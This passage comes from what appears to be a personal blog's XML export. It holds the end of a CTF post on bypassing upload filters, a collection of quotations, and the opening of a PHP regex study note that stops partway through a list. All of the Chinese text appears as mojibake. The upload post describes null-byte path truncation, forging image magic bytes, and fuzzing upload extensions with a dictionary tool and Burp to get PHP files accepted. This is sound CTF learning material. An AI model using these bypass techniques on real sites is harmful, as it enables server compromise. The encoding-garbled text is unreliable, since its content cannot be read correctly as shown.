<p>å¯ä»¥çœ‹å‡ºä»£ç é‡‡ç”¨çš„ç™½åå•æ ¡éªŒï¼Œåªå…è®¸ä¸Šä¼ å›¾ç‰‡æ ¼å¼ï¼Œç†è®ºä¸Šè¿™ä¸ªä¸Šä¼ æ˜¯ä¸å¥½ç»•è¿‡çš„ã€‚ä½†æ˜¯åé¢é‡‡ç”¨ä¿å­˜æ–‡ä»¶çš„æ—¶å€™ï¼Œæ˜¯è·¯å¾„æ‹¼æ¥çš„å½¢å¼ï¼Œè€Œè·¯å¾„åˆæ˜¯ä»å‰ç«¯è·å–ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é‡‡ç”¨åœ¨è·¯å¾„ä¸Šæˆªæ–­ã€‚å¦‚ä¸‹ä¸Šä¼ ï¼Œæ˜¾ç¤ºæ–‡ä»¶è·¯å¾„ä¸­æœ‰ä¸ªç©ºæ ¼ï¼Œè¿™å¹¶ä¸æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„ç©ºæ ¼ï¼Œè€Œæ˜¯%00æˆªæ–­åæ˜¾ç¤ºæˆçš„ç©ºæ ¼ã€‚</p>
<p><img src="https://misakikata.github.io/2019/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1559095054720.png" alt="1559095054720"></p>
<h3 id="æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡"><a href="#æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡" class="headerlink" title="æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡"></a>æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡</h3><p>JPGï¼šæ–‡ä»¶å¤´å‰åä¸ªå­—èŠ‚ä¸º<code>FF D8 FF E0 00 10 4A 46 49 46</code>ï¼ŒFF D8ä»£è¡¨SOIæ ‡è®°ï¼Œæ„æ€æ˜¯å›¾åƒæ–‡ä»¶å¼€å§‹å€¼ã€‚<code>4A 46 49 46</code>ä»£è¡¨å­—ç¬¦ä¸²JFIFæ ‡è®°ã€‚</p>
<p>PNGï¼šå¼€å¤´4å­—èŠ‚ä¸ºå³æ ä¸­<code>â€°PNG</code>å­—æ ·ï¼ŒPNGçš„8å­—èŠ‚æ–‡ä»¶ç½²ååŸŸç”¨æ¥è¯†åˆ«è¯¥æ–‡ä»¶æ˜¯ä¸æ˜¯PNGæ–‡ä»¶ã€‚ä¹Ÿå°±æ˜¯<code>89 50 4E 47 0D 0A 1A 0A</code>ã€‚</p>
<p>GIFï¼šGIF89a</p>
<h2 id="åˆ©ç”¨å·¥å…·å®ç°FUZZ"><a href="#åˆ©ç”¨å·¥å…·å®ç°FUZZ" class="headerlink" title="åˆ©ç”¨å·¥å…·å®ç°FUZZ"></a>åˆ©ç”¨å·¥å…·å®ç°FUZZ</h2><p>å¾ˆå¤šç½‘ç«™å¯¹ä¸Šä¼ è¿›è¡Œæ‹¦æˆªçš„æ—¶å€™é‡‡å–çš„æ˜¯é»‘åå•æ ¡éªŒï¼Œå½“æˆ‘ä»¬çœ‹åˆ°é»‘åå•çš„æ—¶å€™å°±å¯ä»¥è€ƒè™‘é‡‡å–ä¿®æ”¹åç¼€ã€æˆªæ–­ç­‰æ–¹å¼å°è¯•ç»•è¿‡ã€‚</p>
<p>é‡‡ç”¨å·¥å…· <a href="https://github.com/c0ny1/upload-fuzz-dic-builder" target="_blank" rel="noopener">https://github.com/c0ny1/upload-fuzz-dic-builder</a> æ¥ç”Ÿæˆfuzzçš„å­—å…¸ã€‚æ‰§è¡Œå‘½ä»¤:</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">python</span> <span class="selector-tag">upload-fuzz-dic-builder</span><span class="selector-class">.py</span> <span class="selector-tag">-n</span> <span class="selector-tag">test</span> <span class="selector-tag">-a</span> <span class="selector-tag">jpg</span> <span class="selector-tag">-l</span> <span class="selector-tag">php</span> <span class="selector-tag">-m</span> <span class="selector-tag">apache</span> <span class="selector-tag">--os</span> <span class="selector-tag">win</span> <span class="selector-tag">-o</span> <span class="selector-tag">upload_file</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>

<p>æŠŠç”Ÿæˆçš„å­—å…¸å¯¼å…¥burpä¸­ï¼ŒåŒæ—¶å–æ¶ˆpayload-encodingçš„é€‰ä¸­çŠ¶æ€ã€‚æ‰§è¡Œåå¯ä»¥çœ‹åˆ°æœ‰äº›phpæ–‡ä»¶ä¸Šä¼ æˆåŠŸã€‚ç„¶åè®¿é—®å…¶ä¸­ä¸Šä¼ æˆåŠŸçš„æ–‡ä»¶ï¼ŒæŸ¥çœ‹æ˜¯å¦æ‰§è¡Œã€‚</p>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>å¦™è¯­é›†III</title>
    <url>/2020/11/15/%E5%A6%99%E8%AF%AD%E9%9B%86III/</url>
    <content><![CDATA[<p>å‘¨å›´äººä»¬æœ‰è¶£è¨€è®ºçš„ç¢ç‰‡é›†åˆã€‚ç¬¬ä¸‰è¾‘ã€‚</p>
<a id="more"></a>

<ul>
<li>ä½ æˆ‘éƒ½èº«å¤„åœ¨150gçš„ä¸–ç•Œã€‚</li>
</ul>
<div style="text-align: right"><i>by æç¾@bilibili</i></div><hr/>

<ul>
<li>å¢™è¯´ä¸€ä»¶äº‹ï¼ŒæŒºé‡è¦çš„ã€‚å°±æ˜¯å§ï¼Œæˆ‘è§‰å¾—å¹³æ—¶è¦æ˜¯å¸®åŠ©äº†ä½ å°±ä¸è¦è¯´è°¢è°¢å¤§ä½¬ä¹‹ç±»çš„ï¼Œæˆ‘ä¸æ˜¯ä¸€ä¸ªè™šè£çš„äººï¼Œä¸å–œæ¬¢å¬è¿™ç§è¯ï¼Œä¹Ÿè§‰å¾—ä¼šå’Œå¤§å®¶æ‹‰å¼€äº†å¾ˆå¤§è·ç¦»ã€‚æœ‰æ—¶å€™æˆ‘ä¹Ÿåªæ˜¯ä¸ªæ™®é€šäºº, å°±æ­£å¸¸æ„Ÿè°¢ä¸€ä¸‹æˆ‘å°±å¥½äº†ï¼Œæ‰€ä»¥æˆ‘è‡ªå·±å¿ƒé‡Œæœ‰ä¸€ç‚¹éš”åº”ï¼ŒçŸ¥é“çš„çš„äººåº”è¯¥éƒ½çŸ¥é“æˆ‘æ˜¯è°ï¼Œæ‰€ä»¥åŒ¿äº†å§ã€‚å°±æ˜¯å¸Œæœ›å¤§å®¶å¹³æ—¶èƒ½å¤Ÿæ­£å¸¸äº¤æµ,æ‹¥æœ‰è‰¯å¥½çš„å­¦ä¹ æ°›å›´ç½¢äº†ï¼Œå¤§å®¶é—®é¢˜çš„æ—¶å€™ä¹Ÿä¸å¿…å¤ªè¿‡è‡ªå‘äº†ï¼Œå¦„è‡ªè²è–„çš„é£æ°”æˆ‘è§‰å¾—çœŸçš„ä¸æ˜¯å¾ˆå¥½ï¼Œå¤§å®¶éƒ½æ˜¯åŒä¸€ä¸ªå¹´çº§çš„äººï¼Œä¸ºä»€ä¹ˆè¦è¿™ä¹ˆçœ‹ä¸èµ·è‡ªå·±å‘¢, æŒºé˜´é˜³çš„ã€‚æˆ‘ä¹Ÿæ˜¯çœŸè¯šåœ°å¸Œæœ›ä½ ä»¬æ‰€æœ‰äººèƒ½å¥½å¥½åœ°æ´»ç€å•Šï¼Œå¼€å¿ƒä¸€ç‚¹å˜›ï¼Œè®¤çœŸç”Ÿæ´»ï¼Œå¥½å¥½çˆ±äººã€‚</li>
</ul>
<div style="text-align: right"><i>by åŒ¿å@æ’•é€¼å¢™</i></div><hr/>

<ul>
<li>æœ‰äº›äººæ˜ç™½ä»–ä»¬ä¸è¯¥ç²—é²æˆ–å‚²æ…¢çš„æé—®å¹¶è¦æ±‚å¾—åˆ°ç­”å¤ï¼Œä½†ä»–ä»¬é€‰æ‹©å¦ä¸€ä¸ªæç«¯ â€”â€” ä½å£°ä¸‹æ°”ï¼šæˆ‘çŸ¥é“æˆ‘åªæ˜¯ä¸ªå¯æ‚²çš„æ–°æ‰‹ï¼Œä¸€ä¸ªæ’¸ç‘Ÿï¼Œä½†â€¦ã€‚è¿™æ—¢ä½¿äººå›°æ‰°ï¼Œä¹Ÿæ²¡æœ‰ç”¨ï¼Œå°¤å…¶æ˜¯ä¼´éšç€ä¸å®é™…é—®é¢˜å«ç³Šä¸æ¸…çš„æè¿°æ—¶æ›´ä»¤äººåæ„Ÿã€‚åˆ«ç”¨åŸå§‹çµé•¿ç±»åŠ¨ç‰©çš„æŠŠæˆæ¥æµªè´¹ä½ æˆ‘çš„æ—¶é—´ã€‚å–è€Œä»£ä¹‹çš„æ˜¯ï¼Œå°½å¯èƒ½æ¸…æ¥šåœ°æè¿°èƒŒæ™¯æ¡ä»¶å’Œä½ çš„é—®é¢˜æƒ…å†µã€‚è¿™æ¯”ä½å£°ä¸‹æ°”æ›´å¥½åœ°å®šä½äº†ä½ çš„ä½ç½®ã€‚æœ‰æ—¶ç½‘é¡µè®ºå›ä¼šè®¾æœ‰ä¸“ä¸ºæ–°æ‰‹æé—®çš„ç‰ˆé¢ï¼Œå¦‚æœä½ çœŸçš„è®¤ä¸ºé‡åˆ°äº†åˆå­¦è€…çš„é—®é¢˜ï¼Œåˆ°é‚£å»å°±æ˜¯äº†ï¼Œä½†ä¸€æ ·åˆ«é‚£ä¹ˆä½å£°ä¸‹æ°”ã€‚</li>
</ul>
<div style="text-align: right"><i>by æé—®çš„è‰ºæœ¯</i></div><hr/>

<ul>
<li>æ²¡æœ‰ä¸€ä¸ªæ°‘ä¸»è‡ªç”±ã€è¿½æ±‚å…¬å¹³çš„æ”¿æ²»åˆ¶åº¦ä½œä¿è¯ï¼ŒæŠ€æœ¯çš„è¿›æ­¥åªä¼šå¸¦æ¥æƒåŠ›å’Œè´¢å¯Œè¿›ä¸€æ­¥çš„ä¸å…¬ã€‚ä½¿ç”¨ç°ä»£æŠ€æœ¯è¿›è¡Œå¤§æ•°æ®ææƒçš„[<del>è‡ªä¸»è§„åˆ¶</del>]ï¼Œå¯¹ç¤¾ä¼šçš„ç ´ååŠ›å’Œå¯¹äººæ°‘çš„æ å¤ºè¿œè¶…å†å²ä¸Šä»»ä½•ä¸€ä¸ªå°å»ºçš‡æœã€‚</li>
</ul>
<div style="text-align: right"><i>by Hirah Tang@Telegram</i></div><hr/>

<ul>
<li>We hold these truths to be self-evident, that all men are created equal, that they are endowed by their Creator with certain unalienable Rights, that among these are Life, Liberty and the pursuit of Happiness. </li>
</ul>
<div style="text-align: right"><i>by ç‹¬ç«‹å®£è¨€</i></div><hr/>

<ul>
<li>æˆ‘ä»¬å°†åœ¨æ²¡æœ‰é»‘æš—çš„åœ°æ–¹ç›¸è§ã€‚</li>
</ul>
<div style="text-align: right"><i>by George Orwell@1984</i></div><hr/>]]></content>
      <categories>
        <category>æ‚ å“‰æ—¥å¸¸</category>
      </categories>
      <tags>
        <tag>å¦™è¯­é›†</tag>
      </tags>
  </entry>
  <entry>
    <title>æ­£åˆ™å­¦ä¹ ç¬”è®°</title>
    <url>/2020/06/16/%E6%AD%A3%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>CTFä¸­ç»å¸¸å‡ºç°çš„æ­£åˆ™ï¼ŒåŸºç¡€è–„å¼±ã€‚çªå‡»å­¦ä¹ ä¸‹è®°ç‚¹ç¬”è®°ã€‚</p>
<a id="more"></a>

<h2 id="PHPæ­£åˆ™"><a href="#PHPæ­£åˆ™" class="headerlink" title="PHPæ­£åˆ™"></a>PHPæ­£åˆ™</h2><p>PCREåº“å‡½æ•°ä¸­ï¼Œæ­£åˆ™åŒ¹é…æ¨¡å¼ä½¿ç”¨åˆ†éš”ç¬¦ä¸å…ƒå­—ç¬¦ç»„æˆã€‚</p>
<h3 id="åˆ†éš”ç¬¦"><a href="#åˆ†éš”ç¬¦" class="headerlink" title="åˆ†éš”ç¬¦"></a>åˆ†éš”ç¬¦</h3><p>åˆ†éš”ç¬¦å¯ä»¥æ˜¯éæ•°å­—ã€éåæ–œçº¿ã€éç©ºæ ¼çš„ä»»æ„å­—ç¬¦ã€‚ç»å¸¸ä½¿ç”¨çš„åˆ†éš”ç¬¦æ˜¯æ­£æ–œçº¿(/)ã€hashç¬¦å·(#) ä»¥åŠå–åç¬¦å·(~)ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/foo bar/</span><br><span class="line"><span class="comment">#^[^0-9]$#</span></span><br><span class="line">~php~</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ¨¡å¼ä¸­åŒ…å«åˆ†éš”ç¬¦ï¼Œåˆ™åˆ†éš”ç¬¦éœ€è¦ä½¿ç”¨åæ–œæ ï¼ˆ\ï¼‰è¿›è¡Œè½¬ä¹‰ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/http:\/\<span class="comment">//</span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ¨¡å¼ä¸­åŒ…å«è¾ƒå¤šçš„åˆ†å‰²å­—ç¬¦ï¼Œå»ºè®®æ›´æ¢å…¶ä»–çš„å­—ç¬¦ä½œä¸ºåˆ†éš”ç¬¦ï¼Œä¹Ÿå¯ä»¥é‡‡ç”¨preg_quoteè¿›è¡Œè½¬ä¹‰ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$p = <span class="string">'http://'</span>;</span><br><span class="line">$p = <span class="string">'/'</span>.preg_quote($p, <span class="string">'/'</span>).<span class="string">'/'</span>;</span><br><span class="line"><span class="keyword">echo</span> $p;</span><br></pre></td></tr></table></figure>

<p>é™¤äº†ä¸Šé¢æåˆ°çš„åˆ†éš”ç¬¦ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æ‹¬å·æ ·å¼çš„åˆ†éš”ç¬¦ï¼Œå·¦æ‹¬å·å’Œå³æ‹¬å·åˆ†åˆ«ä½œä¸ºå¼€å§‹å’Œç»“æŸ åˆ†éš”ç¬¦ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;this is a pattern&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ†éš”ç¬¦åé¢å¯ä»¥ä½¿ç”¨æ¨¡å¼ä¿®é¥°ç¬¦ï¼ˆiï¼Œmï¼Œsï¼Œxç­‰ï¼‰ã€‚ä¾‹å¦‚ä½¿ç”¨ i ä¿®é¥°ç¬¦å¯ä»¥å¿½ç•¥å¤§å°å†™åŒ¹é…ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$str = <span class="string">"Http://www.imooc.com/"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/http/i'</span>, $str)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'åŒ¹é…æˆåŠŸ'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å…ƒå­—ç¬¦"><a href="#å…ƒå­—ç¬¦" class="headerlink" title="å…ƒå­—ç¬¦"></a>å…ƒå­—ç¬¦</h3><p> ä¸€äº›å­—ç¬¦è¢«èµ‹äºˆ ç‰¹æ®Šçš„æ¶µä¹‰ï¼Œä½¿å…¶ä¸å†å•çº¯çš„ä»£è¡¨è‡ªå·±ï¼Œæ¨¡å¼ä¸­çš„è¿™ç§æœ‰ç‰¹æ®Šæ¶µä¹‰çš„ç¼–ç å­—ç¬¦ ç§°ä¸º <em>å…ƒå­—ç¬¦</em>ã€‚</p>
<p>å…±æœ‰ä¸¤ç§ä¸åŒçš„å…ƒå­—ç¬¦ï¼šä¸€ç§æ˜¯å¯ä»¥åœ¨æ¨¡å¼ä¸­æ–¹æ‹¬å·å¤–ä»»ä½•åœ°æ–¹ä½¿ç”¨çš„ï¼Œå¦å¤–ä¸€ç§ æ˜¯éœ€è¦åœ¨æ–¹æ‹¬å·å†…ä½¿ç”¨çš„ã€‚</p>
<p><strong>åœ¨æ–¹æ‹¬å·å¤–ä½¿ç”¨çš„å…ƒå­—ç¬¦å¦‚ä¸‹ï¼š</strong></p>
<ul>
<li><p>**</p>
<p>ä¸€èˆ¬ç”¨äºè½¬ä¹‰å­—ç¬¦</p>
</li>
<li><p><em>^</em></p>
<p>æ–­è¨€ç›®æ ‡çš„å¼€å§‹ä½ç½®(æˆ–åœ¨å¤šè¡Œæ¨¡å¼ä¸‹æ˜¯è¡Œé¦–)</p>
</li>
<li><p><em>$</em></p>
<p>æ–­è¨€ç›®æ ‡çš„ç»“æŸä½ç½®(æˆ–åœ¨å¤šè¡Œæ¨¡å¼ä¸‹æ˜¯è¡Œå°¾)</p>
</li>
<li><p><em>.</em></p>
<p>åŒ¹é…é™¤æ¢è¡Œç¬¦å¤–çš„ä»»ä½•å­—ç¬¦(é»˜è®¤)</p>
</li>
<li><p><em>[</em></p>
<p>å¼€å§‹å­—ç¬¦ç±»å®šä¹‰</p>
</li>
<li><p><em>]</em></p>
<p>ç»“æŸå­—ç¬¦ç±»å®šä¹‰</p>
</li>
<li><p><em>|</em></p>
<p>å¼€å§‹ä¸€ä¸ªå¯é€‰åˆ†æ”¯</p>
</li>
<li><p><em>(</em></p>
<p>å­ç»„çš„å¼€å§‹æ ‡è®°</p>
</li>
<li><p><em>)</em></p>
<p>å­ç»„çš„ç»“æŸæ ‡è®°</p>
</li>
<li><p><em>?</em></p>
<p>ä½œä¸ºé‡è¯ï¼Œè¡¨ç¤º 0 æ¬¡æˆ– 1 æ¬¡åŒ¹é…ã€‚ä½äºé‡è¯åé¢ç”¨äºæ”¹å˜é‡è¯çš„è´ªå©ªç‰¹æ€§ã€‚ (æŸ¥é˜…<a href="https://www.php.net/manual/zh/regexp.reference.repetition.php" target="_blank" rel="noopener">é‡è¯</a>)</p>
</li>
<li><p><em>*</em></p>
<p>é‡è¯ï¼Œ0 æ¬¡æˆ–å¤šæ¬¡åŒ¹é…</p>
</li>
<li><p><em>+</em></p>
<p>é‡è¯ï¼Œ1 æ¬¡æˆ–å¤šæ¬¡åŒ¹é…</p>
</li>
<li><p><em>{</em></p>
<p>è‡ªå®šä¹‰é‡è¯å¼€å§‹æ ‡è®°</p>
</li>
<li><p><em>}</em></p>
<p>è‡ªå®šä¹‰é‡è¯ç»“æŸæ ‡è®°</p>
</li>
</ul>
<p><strong>æ¨¡å¼ä¸­æ–¹æ‹¬å·å†…çš„éƒ¨åˆ†ç§°ä¸ºâ€œå­—ç¬¦ç±»â€ã€‚ åœ¨ä¸€ä¸ªå­—ç¬¦ç±»ä¸­ä»…æœ‰ä»¥ä¸‹å¯ç”¨å…ƒå­—ç¬¦ï¼š</strong></p>
<ul>
<li><p>**</p>
<p>è½¬ä¹‰å­—ç¬¦</p>
</li>
<li><p><em>^</em></p>
<p>ä»…åœ¨ä½œä¸ºç¬¬ä¸€ä¸ªå­—ç¬¦(æ–¹æ‹¬å·å†…)æ—¶ï¼Œè¡¨æ˜å­—ç¬¦ç±»å–å</p>
</li>
<li><p><em>-</em></p>
<p>æ ‡è®°å­—ç¬¦èŒƒå›´</p>
</li>
</ul>
<h3 id="è½¬ä¹‰åºåˆ—"><a href="#è½¬ä¹‰åºåˆ—" class="headerlink" title="è½¬ä¹‰åºåˆ—"></a>è½¬ä¹‰åºåˆ—</h3><p><em>\n</em></p>
<p>æ¢è¡Œ (åå…­è¿›åˆ¶ 0A)</p>
<p><em>\r</em></p>
<p>å›è½¦ (åå…­è¿›åˆ¶ 0D)</p>
<p><em>\t</em></p>
<p>æ°´å¹³åˆ¶è¡¨ç¬¦ (åå…­è¿›åˆ¶ 09)</p>
<p><em>\xhh</em></p>
<p>hhåå…­è¿›åˆ¶ç¼–ç çš„å­—ç¬¦ï¼Œè¯¦ç»†æŸ¥çœ‹<a href="https://www.php.net/manual/zh/regexp.reference.unicode.php" target="_blank" rel="noopener">unicode properties</a> å±æ€§</p>
<p><em>\ddd</em></p>
<p>dddå…«è¿›åˆ¶ç¼–ç çš„å­—ç¬¦ï¼Œæˆ–è€…åå‘å¼•ç”¨</p>
<p><em>\040</em></p>
<p>ç©ºæ ¼çš„å¦å¤–ä¸€ç§ç”¨æ³•</p>
<p><em>\40</em></p>
<p>å½“æä¾›äº†å°‘äº40ä¸ªå­ç»„æ—¶ä¹Ÿè®¤ä¸ºæ˜¯ç©ºæ ¼ã€‚</p>
<p><em>\d</em></p>
<p>ä»»æ„åè¿›åˆ¶æ•°å­—</p>
<p><em>\D</em></p>
<p>ä»»æ„éåè¿›åˆ¶æ•°å­—</p>
<p><em>\h</em></p>
<p>ä»»æ„æ°´å¹³ç©ºç™½å­—ç¬¦(since PHP 5.2.4)</p>
<p><em>\H</em></p>
<p>ä»»æ„éæ°´å¹³ç©ºç™½å­—ç¬¦(since PHP 5.2.4)</p>
<p><em>\s</em></p>
<p>ä»»æ„ç©ºç™½å­—ç¬¦</p>
<p><em>\S</em></p>
<p>ä»»æ„éç©ºç™½å­—ç¬¦</p>
<p><em>\v</em></p>
<p>ä»»æ„å‚ç›´ç©ºç™½å­—ç¬¦(since PHP 5.2.4)</p>
<p><em>\V</em></p>
<p>ä»»æ„éå‚ç›´ç©ºç™½å­—ç¬¦(since PHP 5.2.4)</p>
<p><em>\w</em></p>
<p>ä»»æ„å•è¯å­—ç¬¦</p>
<p><em>\W</em></p>
<p>ä»»æ„éå•è¯å­—ç¬¦</p>
<p><em>\b</em></p>
<p>å•è¯è¾¹ç•Œ</p>
<p><em>\B</em></p>
<p>éå•è¯è¾¹ç•Œ</p>
<p><em>\A</em></p>
<p>ç›®æ ‡çš„å¼€å§‹ä½ç½®(ç‹¬ç«‹äºå¤šè¡Œæ¨¡å¼)</p>
<p><em>\Z</em></p>
<p>ç›®æ ‡çš„ç»“æŸä½ç½®æˆ–ç»“æŸå¤„çš„æ¢è¡Œç¬¦(ç‹¬ç«‹äºå¤šè¡Œæ¨¡å¼)</p>
<p><em>\z</em></p>
<p>ç›®æ ‡çš„ç»“æŸä½ç½®(ç‹¬ç«‹äºå¤šè¡Œæ¨¡å¼)</p>
<p><em>\G</em></p>
<p>åœ¨ç›®æ ‡ä¸­é¦–æ¬¡åŒ¹é…ä½ç½®</p>
<h3 id="å­—ç¬¦ç±»"><a href="#å­—ç¬¦ç±»" class="headerlink" title="å­—ç¬¦ç±»"></a>å­—ç¬¦ç±»</h3><p>æ–¹æ‹¬å·æ ‡è®°å¼€å§‹ç»“æŸã€‚ä¸€ä¸ªæŒ‰ç±»è€Œä¸æ˜¯æŒ‰é¡ºåºåŒ¹é…çš„è§„åˆ™ã€‚å¦‚</p>
<p>[A-Z0-9]å¯ä»¥åŒ¹é…A-Zæˆ–0-9ä¹‹ä¸­çš„æ‰€æœ‰å†…å®¹ï¼Œè€Œä¸æ˜¯æŒ‰é¡ºåºå…ˆåŒ¹é…å­—æ¯å†åŒ¹é…æ•°å­—ã€‚</p>
<h3 id="å¯é€‰è·¯å¾„"><a href="#å¯é€‰è·¯å¾„" class="headerlink" title="å¯é€‰è·¯å¾„"></a>å¯é€‰è·¯å¾„</h3><p>ç«–çº¿ç”¨äºåˆ†ç¦»æ¨¡å¼ä¸­çš„å¯é€‰è·¯å¾„ã€‚ æ¯”å¦‚æ¨¡å¼<em>gilbert|Sullivan</em>åŒ¹é… â€gilbertâ€ æˆ–è€… â€sullivanâ€ã€‚åŒ¹é…çš„å¤„ç†ä»å·¦åˆ°å³å°è¯•æ¯ä¸€ä¸ªå¯é€‰è·¯å¾„ï¼Œå¹¶ä¸”ä½¿ç”¨ç¬¬ä¸€ä¸ªæˆåŠŸåŒ¹é…çš„ã€‚</p>
<h3 id="ä¿®é¥°ç¬¦"><a href="#ä¿®é¥°ç¬¦" class="headerlink" title="ä¿®é¥°ç¬¦"></a>ä¿®é¥°ç¬¦</h3><table>
<thead>
<tr>
<th><em>i</em></th>
<th>ä¸åŒºåˆ†å¤§å°å†™ï¼ˆignoreï¼‰ for <a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php" target="_blank" rel="noopener">PCRE_CASELESS</a></th>
</tr>
</thead>
<tbody><tr>
<td><em>m</em></td>
<td>å¤šè¡ŒåŒ¹é…ï¼ˆmoreï¼‰ for <a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php" target="_blank" rel="noopener">PCRE_MULTILINE</a></td>
</tr>
<tr>
<td><em>s</em></td>
<td>å¥ç‚¹ä½¿ç”¨æ—¶åŒ¹é…åŒ…å«æ¢è¡Œç¬¦ for <a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php" target="_blank" rel="noopener">PCRE_DOTALL</a></td>
</tr>
<tr>
<td><em>x</em></td>
<td>å°†æ¨¡å¼ä¸­çš„ç©ºç™½å¿½ç•¥ for <a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php" target="_blank" rel="noopener">PCRE_EXTENDED</a></td>
</tr>
<tr>
<td><em>U</em></td>
<td>åªåŒ¹é…æœ€è¿‘çš„ä¸€ä¸ªå­—ç¬¦ä¸²;ä¸é‡å¤åŒ¹é… for <a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php" target="_blank" rel="noopener">PCRE_UNGREEDY</a></td>
</tr>
<tr>
<td><em>X</em></td>
<td>ä»»æ„åæ–œçº¿åæ¥æ²¡æœ‰ç‰¹æ®Šå«ä¹‰çš„å­—ç¬¦ä¼šå¯¼è‡´ä¸€ä¸ªé”™è¯¯ for <a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php" target="_blank" rel="noopener">PCRE_EXTRA</a></td>
</tr>
<tr>
<td><em>J</em></td>
<td>å…è®¸å­ç»„é‡å for <a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php" target="_blank" rel="noopener">PCRE_INFO_JCHANGED</a></td>
</tr>
</tbody></table>
<p>e was <em>DEPRECATED</em> in PHP 5.5.0, and <em>REMOVED</em> as of PHP 7.0.0. å¦‚æœè®¾ç½®äº†è¿™ä¸ªè¢«å¼ƒç”¨çš„ä¿®é¥°ç¬¦ï¼Œ <a href="https://www.php.net/manual/zh/function.preg-replace.php" target="_blank" rel="noopener">preg_replace()</a> åœ¨è¿›è¡Œäº†å¯¹æ›¿æ¢å­—ç¬¦ä¸²çš„ åå‘å¼•ç”¨æ›¿æ¢ä¹‹å, å°†æ›¿æ¢åçš„å­—ç¬¦ä¸²ä½œä¸ºphp ä»£ç è¯„ä¼°æ‰§è¡Œ(eval å‡½æ•°æ–¹å¼)ï¼Œå¹¶ä½¿ç”¨æ‰§è¡Œç»“æœ ä½œä¸ºå®é™…å‚ä¸æ›¿æ¢çš„å­—ç¬¦ä¸²ã€‚å•å¼•å·ã€åŒå¼•å·ã€åæ–œçº¿(**)å’Œ NULL å­—ç¬¦åœ¨ åå‘å¼•ç”¨æ›¿æ¢æ—¶ä¼šè¢«ç”¨åæ–œçº¿è½¬ä¹‰.è¯¦è§phpæ‰‹å†Œã€‚</p>
<p><em>A</em> (<em>PCRE_ANCHORED</em>)  å¦‚æœè®¾ç½®äº†è¿™ä¸ªä¿®é¥°ç¬¦ï¼Œæ¨¡å¼è¢«å¼ºåˆ¶ä¸ºâ€é”šå®šâ€æ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯è¯´çº¦æŸåŒ¹é…ä½¿å…¶ä»…ä» ç›®æ ‡å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®æœç´¢ã€‚è¿™ä¸ªæ•ˆæœåŒæ ·å¯ä»¥ä½¿ç”¨é€‚å½“çš„æ¨¡å¼æ„é€ å‡ºæ¥ï¼Œå¹¶ä¸” è¿™ä¹Ÿæ˜¯ perl ç§å®ç°è¿™ç§æ¨¡å¼çš„å”¯ä¸€é€”å¾„ã€‚</p>
<p><em>U</em> (<em>PCRE_UNGREEDY</em>)  è¿™ä¸ªä¿®é¥°ç¬¦é€†è½¬äº†é‡è¯çš„â€è´ªå©ªâ€æ¨¡å¼ã€‚ ä½¿é‡è¯é»˜è®¤ä¸ºéè´ªå©ªçš„ï¼Œé€šè¿‡é‡è¯åç´§è·Ÿ*?* çš„æ–¹å¼å¯ä»¥ä½¿å…¶æˆä¸ºè´ªå©ªçš„ã€‚è¿™å’Œ perl æ˜¯ä¸å…¼å®¹çš„ã€‚ å®ƒåŒæ ·å¯ä»¥ä½¿ç”¨ <a href="https://www.php.net/manual/zh/regexp.reference.internal-options.php" target="_blank" rel="noopener">æ¨¡å¼å†…ä¿®é¥°ç¬¦è®¾ç½®</a> (<em>?U</em>)è¿›è¡Œè®¾ç½®ï¼Œ æˆ–è€…åœ¨é‡è¯åä»¥é—®å·æ ‡è®°å…¶éè´ªå©ª(æ¯”å¦‚*.*?*)ã€‚</p>
<h3 id="å­ç»„"><a href="#å­ç»„" class="headerlink" title="å­ç»„"></a>å­ç»„</h3><p>å­ç»„é€šè¿‡åœ†æ‹¬å·åˆ†éš”ç•Œå®šï¼Œå¹¶ä¸”å®ƒä»¬å¯ä»¥åµŒå¥—ã€‚ å°†ä¸€ä¸ªæ¨¡å¼ä¸­çš„ä¸€éƒ¨åˆ†æ ‡è®°ä¸ºå­ç»„(å­æ¨¡å¼)ä¸»è¦æ˜¯æ¥åšä¸¤ä»¶äº‹æƒ…ï¼š</p>
<ol>
